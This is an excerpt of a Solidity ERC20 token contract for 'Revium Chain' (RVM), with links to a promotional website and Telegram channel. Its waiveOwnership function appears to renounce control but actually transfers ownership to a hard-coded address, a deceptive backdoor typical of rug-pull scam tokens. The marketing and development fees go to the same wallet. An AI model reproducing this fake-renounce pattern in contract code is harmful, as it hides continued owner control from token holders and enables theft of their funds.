...
/**
Website : https://reviumchain.us
Telegram : https://t.me/reviumchainportal
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3Eb000812f312cF5de65cE4022dE224EdBD82BaD);
    }
...
contract REVIUMCHAIN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Revium Chain";
    string private _symbol = "RVM";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xa8c7Dc867C47c591C262f34B3B1aD1686dcFFd87);
    address payable private developmentWalletAddress = payable(0xa8c7Dc867C47c591C262f34B3B1aD1686dcFFd87);
